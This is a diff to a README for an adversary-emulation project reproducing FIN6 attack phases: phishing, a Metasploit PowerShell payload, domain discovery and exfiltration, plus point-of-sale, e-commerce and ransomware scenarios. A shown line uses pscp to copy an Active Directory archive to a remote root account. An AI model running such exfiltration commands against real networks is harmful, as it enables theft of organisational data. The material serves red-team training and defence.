@@ -2,9 +2,25 @@
 
 This project emulates the tactics, techniques, and procedures (TTPs) of the FIN6 advanced persistent threat (APT) group. FIN6 is known for targeting payment card data in point-of-sale (POS) environments, leveraging techniques such as memory scraping, credential dumping, and exfiltration via DNS tunneling. This emulation focuses on phases 1 and 2 of the FIN6 attack.
 
+![Op_Flow](Documentation/OpFlow_Diagram.png)
+
+*Sourced from Center for Threat-Informed Defense’s analysis of FIN6.*
+
+---
+
 Phase 1 Start by Phishing email which downloads a Word doc file after opening it. a PowerShell metasploit payload runs after the Discovery of Users, Computers, Groups, OU, and other parts of the domain after that, the attacker compresses and extracts all that data using SSH through that attacker doing Privilege Escalation using various methods.
 
-Phase 2 :
+Phase 2: had 3 Scenarios
+
+```
+Scenario 1 - Attacking Point of Sale (POS) Systems
+
+Scenario 2 - Attacking E-Commerce Platforms
+
+Scenario 3 - Deploying Ransomware
+```
+
+*Sourced from Center for Threat-Informed Defense’s analysis of FIN6.*
 
 
 
@@ -20,6 +36,9 @@ The primary goal of this emulation is to provide a realistic representation of F
 ## Phases Breakdown
 
 ### Phase 1
+
+![outline_phase1-1](Documentation/phase1-1.png)
+![outline_phase1-1](Documentation/phase1-2.png)
 
 #### Initial Access
 
@@ -94,6 +113,12 @@ Exfiltration Over Web Service: Exfiltration to Cloud Storage: T1567.002
 ```sh
 pscp.exe -P {port} {path_on_windows}\ad.7z root@192.168.1.13:/temp/
 ```
+
+---
+
+### Phase2 
+
+![outline_phase2](Documentation/phase2.png)
 
 ## Credits
 
